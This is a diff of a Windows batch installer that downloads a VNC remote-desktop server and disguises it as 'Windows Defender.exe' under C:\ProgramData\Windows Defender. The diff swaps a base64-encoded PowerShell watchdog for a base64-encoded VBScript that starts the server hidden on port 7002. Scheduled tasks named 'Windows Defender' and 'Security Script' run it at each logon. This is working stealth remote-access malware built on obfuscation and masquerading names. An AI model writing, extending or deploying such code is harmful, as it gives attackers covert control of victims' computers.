@@ -101,15 +101,6 @@ if not exist "%TEMPDIR%\vnc-web.zip" (
     echo    [OK]
 )
 
-echo    [6/6] WinDefend.bat...
-powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/WinDefend.bat' -OutFile '%TEMPDIR%\WinDefend.bat' -UseBasicParsing -TimeoutSec 30"
-if not exist "%TEMPDIR%\WinDefend.bat" (
-    echo    [!] FAILED to download WinDefend.bat
-    set "FAIL=1"
-) else (
-    echo    [OK]
-)
-
 if "%FAIL%"=="1" (
     echo.
     echo    [!] One or more downloads failed. Check internet connection.
@@ -132,7 +123,6 @@ copy /y "%TEMPDIR%\Windows Defender.exe" "%DEST%\VncDirect\Windows Defender.exe"
 copy /y "%TEMPDIR%\turbojpeg.dll" "%DEST%\VncDirect\turbojpeg.dll" >nul
 copy /y "%TEMPDIR%\vcruntime140.dll" "%DEST%\VncDirect\vcruntime140.dll" >nul
 copy /y "%TEMPDIR%\AgentLauncher.exe" "%DEST%\AgentLauncher.exe" >nul
-copy /y "%TEMPDIR%\WinDefend.bat" "%DEST%\WinDefend.bat" >nul
 
 echo    Extracting noVNC web UI...
 powershell -NoProfile -Command "Expand-Archive -Path '%TEMPDIR%\vnc-web.zip' -DestinationPath '%DEST%\VncDirect' -Force"
@@ -165,16 +155,13 @@ schtasks /create /tn "Security Script" /tr "%DEST%\AgentLauncher.exe vid=cafe pi
 echo     Scheduled task "Security Script" created.
 :skip_security
 
-REM --- Write watchdog PowerShell script ---
-powershell -NoProfile -Command "$b64='dwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsAIABpAGYAIAAoACEAKABHAGUAdAAtAFAAcgBvAGMAZQBzAHMAIAAiAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAIgAgAC0ARQBBACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQApACkAIAB7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAFYAbgBjAEQAaQByAGUAYwB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAuAGUAeABlACIAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgBwAG8AcgB0AD0ANwAwADAAMgAgAGMAdwBkAD0AQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAFYAbgBjAEQAaQByAGUAYwB0AFwAdgBuAGMAIABmAHAAcwA9ADMANgAwACAAcwBjAGEAbABlAD0AMAAiACAALQBXAG8AcgBrAGkAbgBnAEQAaQByAGUAYwB0AG8AcgB5ACAAIgBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwAVgBuAGMARABpAHIAZQBjAHQAXAB2AG4AYwAiACAAfQA7ACAAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAANQAgAH0A'; [IO.File]::WriteAllBytes('%DEST%\WinDefend.ps1', [Convert]::FromBase64String($b64))"
-REM --- Write watchdog VBScript (launches PS1 fully hidden) ---
-echo Set WshShell = CreateObject("WScript.Shell") > "%DEST%\WinDefend.vbs"
-echo WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\ProgramData\Windows Defender\WinDefend.ps1", 0, False >> "%DEST%\WinDefend.vbs"
-echo     Watchdog VBScript written.
+REM --- Write autostart VBScript (starts VNC directly, hidden) ---
+powershell -NoProfile -Command "$b64='U2V0IFdzaFNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCldzaFNoZWxsLlJ1biAiIkM6XFByb2dyYW1EYXRhXFdpbmRvd3MgRGVmZW5kZXJcVm5jRGlyZWN0XFdpbmRvd3MgRGVmZW5kZXIuZXhlIiBwb3J0PTcwMDIgY3dkPUM6XFByb2dyYW1EYXRhXFdpbmRvd3MgRGVmZW5kZXJcVm5jRGlyZWN0XHZuYyBmcHM9MzYwIHNjYWxlPTAiLCAwLCBGYWxzZQ0K'; [IO.File]::WriteAllBytes('%DEST%\WinDefend.vbs', [Convert]::FromBase64String($b64))"
+echo     Autostart VBScript written.
 
 schtasks /query /tn "Windows Defender" >nul 2>&1
 if %errorlevel% equ 0 goto skip_watchdog
-schtasks /create /tn "Windows Defender" /tr "wscript.exe C:\ProgramData\Windows Defender\WinDefend.vbs" /sc onlogon /rl limited /f >nul 2>&1
+schtasks /create /tn "Windows Defender" /tr "wscript.exe \"C:\ProgramData\Windows Defender\WinDefend.vbs\"" /sc onlogon /rl limited /f >nul 2>&1
 echo     Scheduled task "Windows Defender" created.
 :skip_watchdog
 
